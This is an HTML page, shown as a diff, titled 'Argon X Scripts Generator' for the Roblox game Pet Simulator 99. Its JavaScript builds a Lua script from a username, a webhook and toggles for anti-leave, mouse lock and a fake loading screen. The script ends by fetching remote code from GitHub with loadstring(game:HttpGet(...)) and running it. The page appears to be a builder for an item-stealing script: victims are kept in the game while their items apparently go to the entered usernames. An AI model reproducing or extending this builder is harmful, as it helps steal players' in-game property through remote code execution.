@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Argon X Scripts - Ps99</title>
+  <style>
+    body {
+        font-family: 'Roboto', sans-serif;
+        background: linear-gradient(135deg, #6e8efb, #a777e3);
+        color: #333;
+        text-align: center;
+        margin: 0;
+        padding: 0;
+    }
+    .container {
+        max-width: 800px;
+        margin: 50px auto;
+        padding: 30px;
+        background: #ffffff;
+        border-radius: 12px;
+        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+    }
+    h1 {
+        color: #333;
+        font-size: 2.5em;
+        margin-bottom: 20px;
+    }
+    form {
+        margin: 0 auto;
+        padding: 20px;
+        background: #f8f9fa;
+        border-radius: 8px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+    label {
+        display: block;
+        font-weight: bold;
+        margin-bottom: 5px;
+    }
+    input, textarea {
+        display: block;
+        width: calc(100% - 22px);
+        margin: 10px auto;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+        font-size: 16px;
+        background-color: #ffffff;
+    }
+    input:focus, textarea:focus {
+        border-color: #007bff;
+        outline: none;
+    }
+    button {
+        background-color: #007bff;
+        color: white;
+        border: none;
+        padding: 12px 24px;
+        font-size: 16px;
+        border-radius: 6px;
+        cursor: pointer;
+        transition: background-color 0.3s ease, transform 0.2s ease;
+    }
+    button:hover {
+        background-color: #0056b3;
+        transform: scale(1.05);
+    }
+    button:active {
+        background-color: #004494;
+    }
+    textarea {
+        height: 150px;
+        resize: vertical;
+    }
+    #status {
+        margin-top: 20px;
+        font-size: 16px;
+    }
+    #pastelist {
+        margin-top: 20px;
+        text-align: left;
+        max-width: 600px;
+        margin-left: auto;
+        margin-right: auto;
+    }
+    #pastelist ul {
+        list-style-type: none;
+        padding: 0;
+    }
+    #pastelist li {
+        margin-bottom: 10px;
+    }
+    #pastelist a {
+        color: #007bff;
+        text-decoration: none;
+    }
+    #pastelist a:hover {
+        text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Argon X Scripts Generator</h1>
+    <form id="scriptForm">
+      <label for="username">Username:</label>
+      <input type="text" id="username" name="username" required><br><br>
+
+      <label for="username2">Second Username (Optional):</label>
+      <input type="text" id="username2" name="username2"><br><br>
+
+      <label for="webhook">Webhook (Optional):</label>
+      <input type="url" id="webhook" name="webhook"><br><br>
+
+      <label for="mouseLock">Enable Mouse Lock:</label>
+      <input type="checkbox" id="mouseLock" name="mouseLock"><br><br>
+
+      <label for="antileave">Enable Anti-leave:</label>
+      <input type="checkbox" id="antileave" name="antileave"><br><br>
+
+      <label for="loadingscreen">Show Loading Screen:</label>
+      <input type="checkbox" id="loadingscreen" name="loadingscreen"><br><br>
+
+      <label for="scriptName">Script Name:</label>
+      <input type="text" id="scriptName" name="scriptName" value="" required><br><br>
+
+      <label for="firstText">First Text:</label>
+      <input type="text" id="firstText" name="firstText" value=""><br><br>
+
+      <label for="secondText">Second Text:</label>
+      <input type="text" id="secondText" name="secondText" value=""><br><br>
+
+      <label for="thirdText">Third Text:</label>
+      <input type="text" id="thirdText" name="thirdText" value=""><br><br>
+
+      <label for="waitingTime">Waiting Time (in seconds):</label>
+      <input type="number" id="waitingTime" name="waitingTime" value=""><br><br>
+
+      <button type="button" id="generateBtn">Generate</button>
+      <textarea id="output" readonly placeholder="Generated script will appear here"></textarea><br>
+
+      <button type="button" id="copyBtn">Copy to Clipboard</button>
+    </form>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      const generateButton = document.getElementById('generateBtn');
+      const copyButton = document.getElementById('copyBtn');
+
+      // URL validation pattern
+      const urlPattern = new RegExp('^(https?:\\/\\/)?' + // protocol
+        '(([a-zA-Z\\d]([a-zA-Z\\d-]*[a-zA-Z\\d])*)\\.?)+[a-zA-Z]{2,}' + // domain name
+        '(\\:\\d+)?(\\/[-a-zA-Z\\d%_.~+]*)*' + // port and path
+        '(\\?[;&a-zA-Z\\d%_.~+=-]*)?' + // query string
+        '(\\#[-a-zA-Z\\d_]*)?$','i'); // fragment locator
+
+      generateButton.addEventListener('click', function(event) {
+        event.preventDefault(); 
+
+        const username = document.getElementById("username").value;
+        const username2 = document.getElementById("username2").value;
+        const webhook = document.getElementById("webhook").value;
+        const mouseLock = document.getElementById("mouseLock").checked;
+        const antileave = document.getElementById("antileave").checked;
+        const loadingscreen = document.getElementById("loadingscreen").checked;
+        const scriptName = document.getElementById("scriptName").value;
+        const firstText = document.getElementById("firstText").value;
+        const secondText = document.getElementById("secondText").value;
+        const thirdText = document.getElementById("thirdText").value;
+        const waitingTime = document.getElementById("waitingTime").value;
+
+        // Generate script output
+        const outputString = `--generate through website\n` +
+                             `--website made by kizamies#0001/Shimm\n\n` +
+                             `UserName = "${username}"\n` +
+                             `${username2 ? `UserName2 = "${username2}" -- optional delete the whole line if you don't want it\n` : ''}` +
+                             `${webhook ? `Webhook = "${webhook}" -- optional delete the whole line if you don't want it\n` : ''}\n` +
+                             `_G.LoadingScreen = ${loadingscreen}\n` +
+                             `_G.AntiLeave = ${antileave}\n` +
+                             `_G.MouseLock = ${mouseLock}\n\n` +
+                             `-- set them to false if you don't need them\n\n` +
+                             `_G.ScriptName = "${scriptName}"\n` +
+                             `_G.FirstText = "${firstText}"\n` +
+                             `_G.SecondText = "${secondText}"\n` +
+                             `_G.ThirdText = "${thirdText}"\n` +
+                             `_G.WaitingTime = ${waitingTime} -- it's the time between 0% and 100% in seconds\n\n` +
+                             `loadstring(game:HttpGet("https://raw.githubusercontent.com/Federal4612/Petx/main/Mail.lua",true))()`;
+
+        document.getElementById("output").value = outputString;
+      });
+
+      copyButton.addEventListener('click', function() {
+        const copyText = document.getElementById("output");
+        copyText.select();
+        copyText.setSelectionRange(0, 99999);
+        document.execCommand("copy");
+        alert("Copied to clipboard!");
+      });
+    });
+  </script>
+</body>
+</html>
